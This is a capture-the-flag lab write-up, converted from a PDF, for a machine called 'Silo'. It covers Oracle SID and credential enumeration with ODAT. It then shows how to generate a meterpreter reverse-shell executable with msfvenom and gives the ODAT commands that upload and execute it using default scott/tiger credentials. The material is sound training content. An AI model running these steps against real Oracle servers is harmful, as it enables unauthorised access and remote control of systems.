# Silo

*Converted from: Silo.pdf*

---

# Silo
## **18 [th] August 2018 / Document No D18.100.14**

**Prepared By: Alexander Reid (Arrexel)**

**Machine Author: egre55**

**Difficulty: Medium**

**Classification: Official**


Page 1 / 5


## **SYNOPSIS**

Silo focuses mainly on leveraging Oracle to obtain a shell and escalate privileges. It was intended

to be completed manually using various tools, however Oracle Database Attack Tool greatly

simplifies the process, reducing the difficulty of the machine substantially.


## **Skills Required**


  - Intermediate knowledge of Windows

  - Basic knowledge of Oracle

enumeration techniques


## **Skills Learned**


  - Enumerating Oracle SIDs

  - Enumerating Oracle credentials

  - Leveraging Oracle to upload and

execute files


Page 2 / 5


## **Enumeration** **Nmap**

Nmap reveals many open ports, most notably an Oracle database.



Page 3 / 5


​


## **Exploitation** **Oracle**

[ODAT: https://github.com/quentinhardy/odat​](https://github.com/quentinhardy/odat)


Using Oracle Database Attack Tool (ODAT), it is fairly straightforward to obtain a valid SID. ODAT

can also be leveraged to brute force some credentials, however the default ODAT wordlist is

uppercase-only, so it must be substituted with the Metasploit wordlist (which requires changing

the combo separator from space to /). If installing ODAT for the first time, follow the installation

steps closely on the Github page, or use one of the static releases.


Page 4 / 5



​



​


​ ​ ​

​


​


​



With the SID and a set of credentials at hand, it is possible to upload and execute arbitrary files

​ ​ ​

​


​


​



with **utlfile** ​ and **externaltable** ​ in ODAT. Note that the **--sysdba** ​ flag must be set for both. Any

​


​


​



​ ​ ​

executable should work, with the simplest method being **msfvenom -p** ​


​


​



​ ​ ​

​

**windows/x64/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe > writeup.exe**


​


​



​ ​ ​

​


Upload file: **./odat.py utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/** ​

**writeup.exe writeup.exe**


​



​ ​ ​

​


​


​



​ ​ ​

​


​


Execute file: **./odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec** ​

**c:/ writeup.exe**


Page 5 / 5



​ ​ ​

​


​


​



​ ​ ​

​


​


​


